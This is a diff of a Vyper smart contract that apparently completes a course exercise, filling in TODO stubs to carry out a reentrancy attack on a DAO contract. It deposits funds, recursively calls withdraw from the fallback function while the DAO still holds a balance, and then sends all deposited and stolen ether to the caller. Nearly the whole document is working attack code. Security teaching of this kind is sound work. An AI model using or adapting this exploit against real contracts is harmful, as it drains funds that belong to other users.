@@ -13,13 +13,13 @@ def __init__():
 
 @internal
 def _attack() -> bool:
-    assert self.dao_address != empty(address)
+    assert self.dao_address != ZERO_ADDRESS
     
     # TODO: Use the DAO interface to withdraw funds.
     # Make sure you add a "base case" to end the recursion
     if self.dao_address.balance <=0:
         return false
-    DAO.withdraw()
+    return DAO(self.dao_address).withdraw()
     return True
 
 @external
@@ -33,13 +33,14 @@ def attack(dao_address:address):
         deposit_amount = dao_address.balance
     
     # TODO: make the deposit into the DAO 
-    DAO.deposit()  
+    DAO(dao_address).deposit(value=deposit_amount)  
     
     # TODO: Start the reentrancy attack
-    _attack()
+    self._attack()
 
     # TODO: After the recursion has finished, all the stolen funds are held by this contract. Now, you need to send all funds (deposited and stolen) to the entity that called this contract
-    send(msg.sender,deposit_amount)
+    self.owner_address=msg.sender
+    send(msg.sender,self.balance)
     pass
 
 @external
@@ -48,8 +49,8 @@ def __default__():
     # This method gets invoked when ETH is sent to this contract's address (i.e., when "withdraw" is called on the DAO contract)
     
     # TODO: Add code here to complete the recursive call
-    if dao_address.balance < msg.value:
-        DAO.withdraw()
+    if self.dao_address.balance >= msg.value:
+        DAO(self.dao_address).withdraw()
 
 
     pass
